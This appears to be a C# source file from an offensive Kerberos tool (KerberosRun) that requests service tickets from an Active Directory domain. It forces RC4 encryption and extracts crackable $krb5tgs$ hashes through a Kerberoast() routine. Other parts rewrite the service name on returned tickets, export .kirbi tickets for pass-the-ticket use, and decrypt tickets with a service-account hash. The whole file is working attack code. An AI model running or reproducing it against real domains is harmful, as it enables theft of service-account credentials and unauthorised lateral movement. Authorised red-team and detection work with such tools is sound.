using Kerberos.NET;
using Kerberos.NET.Client;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using Kerberos.NET.Transport;
using NLog;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KerberosRun
{
    public class TGS
    {

        private readonly DateTime now;
        private readonly TcpKerberosTransport transport;
        private KerberosCredential cred;
        private static KrbTicket tgt;
        private static KrbEncryptionKey sessionKey;
        private KrbEncryptionKey subSessionKey;
        private KrbTgsReq tgsReq;
        private KrbTgsRep tgsRep;
        private KrbEncTgsRepPart tgsDecryptedRepPart;
        private byte[] kirbiTGS;
        private string clientName;

        Logger logger;

        public TGS(KrbTicket ticket, KrbEncryptionKey key)
        {
            logger = LogManager.GetCurrentClassLogger();
            now = DateTime.Now;
            transport = new TcpKerberosTransport(null);

            tgt = ticket;
            sessionKey = key;
            cred = Helper.GetCredFromOption();
        }


        public TGS(TGT myTGT) : this(tgt, sessionKey)
        {
            tgt = myTGT.Ticket;
            sessionKey = myTGT.sessionKey;
        }

        public TGS(string tgtKirbi): this(tgt, sessionKey)
        {
            var info = Kirbi.GetTicketFromKirbi(tgtKirbi);
            tgt = info.Ticket;
            sessionKey = info.SessionKey;
            clientName = info.CNAME;
        }


        public void CreateTGSReq()
        {
            //Request Service Ticket parameters
            ApOptions apOptions = ApOptions.Reserved;
            KdcOptions kdcOptions = KdcOptions.Forwardable |
                                    KdcOptions.Renewable |
                                    KdcOptions.RenewableOk |
                                    KdcOptions.Canonicalize;
            string s4u = null;
            KrbTicket s4uTicket = null;
            KrbTicket u2uServerTicket = null;
            string spn = Options.Instance.Spn;

            //if (isUnconstrained)
            //{
            //    spn = $"krbtgt/{Options.Instance.Domain}";
            //    kdcOptions |= KdcOptions.Forwarded;
            //}

            var rst = new RequestServiceTicket()
            {
                ServicePrincipalName = spn,
                ApOptions = apOptions,
                S4uTarget = s4u,
                S4uTicket = s4uTicket,
                UserToUserTicket = u2uServerTicket,
                KdcOptions = kdcOptions,
                Realm = tgt.Realm
            };

            var additionalTickets = new List<KrbTicket>();

            if (rst.KdcOptions.HasFlag(KdcOptions.EncTktInSkey) && rst.UserToUserTicket != null)
            {
                additionalTickets.Add(rst.UserToUserTicket);
            }
            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                rst.KdcOptions |= KdcOptions.Forwardable;
            }
            if (rst.S4uTicket != null)
            {
                rst.KdcOptions |= KdcOptions.ConstrainedDelegation;

                additionalTickets.Add(rst.S4uTicket);
            }


            var sname = rst.ServicePrincipalName.Split('/', '@');
            //var sname = new string[] { rst.ServicePrincipalName };

            var body = new KrbKdcReqBody
            {
                //Specify RC4 as the only supported EType
                EType = new[] { EncryptionType.RC4_HMAC_NT },//KrbConstants.KerberosConstants.ETypes.ToArray(),
                KdcOptions = rst.KdcOptions,
                Nonce = KrbConstants.KerberosConstants.GetNonce(),
                Realm = rst.Realm,
                SName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    //Type = (PrincipalNameType)Utils.Utils.PrincipalNameType.NT_MS_PRINCIPAL,
                    Name = sname
                },
                Till = KrbConstants.KerberosConstants.EndOfTime,
                CName = rst.CNameHint
            };

            if (additionalTickets.Count > 0)
            {
                body.AdditionalTickets = additionalTickets.ToArray();
            }

            var bodyChecksum = KrbChecksum.Create(
                body.Encode(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqChecksum
            );

            //ApReq
            //Authenticator


            clientName = string.IsNullOrEmpty(Options.Instance.User) ? clientName : Options.Instance.User;
            string[] name = { clientName };

            var Name = new KrbPrincipalName()
            {
                Type = PrincipalNameType.NT_PRINCIPAL,
                Name = name// + "@" + domainName.ToUpper() }
            };
            var authenticator = new KrbAuthenticator
            {
                CName = Name,
                Realm = tgt.Realm,
                SequenceNumber = KrbConstants.KerberosConstants.GetNonce(),
                Checksum = bodyChecksum,
                CTime = now,
                CuSec = now.Millisecond //new Random().Next(0, 999999)
            };

            subSessionKey = KrbEncryptionKey.Generate(sessionKey.EType);
            subSessionKey.Usage = KeyUsage.EncTgsRepPartSubSessionKey;
            authenticator.Subkey = subSessionKey;

            KrbEncryptedData encryptedAuthenticator = null;
            try
            {
                encryptedAuthenticator = KrbEncryptedData.Encrypt(
                    authenticator.EncodeApplication(),
                    sessionKey.AsKey(),
                    KeyUsage.PaTgsReqAuthenticator);

            }
            catch (Exception e)
            {
                logger.Error(e.Message);
                Environment.Exit(1);
            }

            var apReq = new KrbApReq
            {
                Ticket = tgt,
                ApOptions = apOptions,
                Authenticator = encryptedAuthenticator
            };


            var pacOptions = new KrbPaPacOptions
            {
                Flags = PacOptions.BranchAware
            }.Encode();

            var paData = new List<KrbPaData>()
            {
                new KrbPaData
                {
                    Type = PaDataType.PA_TGS_REQ,
                    Value = apReq.EncodeApplication()
                },
                new KrbPaData
                {
                    Type = PaDataType.PA_PAC_OPTIONS,
                    Value = pacOptions
                }
            };



            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                var paS4u = new KrbPaForUser
                {
                    AuthPackage = "Kerberos",
                    UserName = new KrbPrincipalName { Type = PrincipalNameType.NT_ENTERPRISE, Name = new[] { s4u } },
                    UserRealm = tgt.Realm
                };
                paS4u.GenerateChecksum(subSessionKey.AsKey());

                paData.Add(new KrbPaData
                {
                    Type = PaDataType.PA_FOR_USER,
                    Value = paS4u.Encode()
                });
            }

            tgsReq = new KrbTgsReq
            {
                PaData = paData.ToArray(),
                Body = body
            };

        }


        public async Task<KrbTgsRep> AskTGS()
        {
            CreateTGSReq();

            var encodedTgs = tgsReq.EncodeApplication();

            logger.Info("[*] Sending TGS-REQ ...");
            if (Options.Instance.Verbose) { Display.PrintReq(tgsReq, cred.CreateKey(), sessionKey.AsKey()); }


            CancellationToken cancellation = default;
            cancellation.ThrowIfCancellationRequested();

            try
            {
                tgsRep = await transport.SendMessage<KrbTgsRep>(
                    tgt.Realm,
                    encodedTgs,
                    cancellation
                );
            }
            catch (KerberosProtocolException pex)
            {
                logger.Info("[x] Kerberos Error: {0}\n", pex.Message);
                Environment.Exit(0);
            }


            logger.Info("[*] Receiving TGS-REP ...");
            if (Options.Instance.Verbose) { Display.PrintRep(tgsRep, cred.CreateKey()); }



            //TGS-REP Enc-Part
            tgsDecryptedRepPart = tgsRep.EncPart.Decrypt<KrbEncTgsRepPart>(
                subSessionKey.AsKey(),
                KeyUsage.EncTgsRepPartSubSessionKey,
                (ReadOnlyMemory<byte> t) => KrbEncTgsRepPart.DecodeApplication(t));

            //alternative service name
            if (Options.Instance.AltService != null)
            {
                var subSrvName = new KrbPrincipalName
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = Options.Instance.AltService.Split('/')
                };
                tgsDecryptedRepPart.SName = subSrvName;
                tgsRep.Ticket.SName = subSrvName;
            }

            kirbiTGS = Kirbi.GetKirbi(tgsRep, tgsDecryptedRepPart, Options.Instance.PTT);

            //var returnFlag = TicketFlags.Anonymous;


            return tgsRep;
        }


        public string Kerberoast()
        {
            var encType = (int)Enum.Parse(typeof(EncryptionType), tgsRep.Ticket.EncryptedPart.EType.ToString());

            var myCipher = (BitConverter.ToString(tgsRep.Ticket.EncryptedPart.Cipher.ToArray())).Replace("-", "");

            var kroasthash = string.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, Options.Instance.User, Options.Instance.Domain, Options.Instance.Spn, myCipher.Substring(0, 32), myCipher.Substring(32));
            
            return kroasthash;
        }


        public void DisplayTGS()
        {
            if (!Options.Instance.Verbose) { return; }
            Display.PrintReq(tgsReq, cred.CreateKey(), sessionKey.AsKey());

            Display.PrintRep(tgsRep, cred.CreateKey());

            Console.WriteLine("    * [Decrypted Enc-Part]:");
            Display.PrintRepEnc(tgsDecryptedRepPart, cred.CreateKey());

            if (!string.IsNullOrEmpty(Options.Instance.DecryptTGS))
            {
                //=========================================
                //TGS Tiket Enc-Part
                //Service account Cred
                var kerbCred2 = new KerberosHashCreds(Options.Instance.SrvName, Options.Instance.DecryptTGS, KerberosRun.decryptEtype);

                //TGS-REQ Ticket Enc-Part
                KrbEncTicketPart ticketDecrypted = tgsRep.Ticket.EncryptedPart.Decrypt<KrbEncTicketPart>
                    (kerbCred2.CreateKey(),
                    KeyUsage.Ticket,
                    (ReadOnlyMemory<byte> t) => KrbEncTicketPart.DecodeApplication(t));

                Console.WriteLine("    * [Decrypted Ticket Enc-Part]:");
                Display.PrintTicketEnc(ticketDecrypted);
                //=========================================

            }

        }


        public string ToKirbi()
        {
            return Convert.ToBase64String(kirbiTGS);
        }

        public void ToFile()
        {
            Utils.WriteBytesToFile(Utils.MakeTicketFileName(Options.Instance.User, Options.Instance.Spn.Split('/')), kirbiTGS);
        }


    }
}
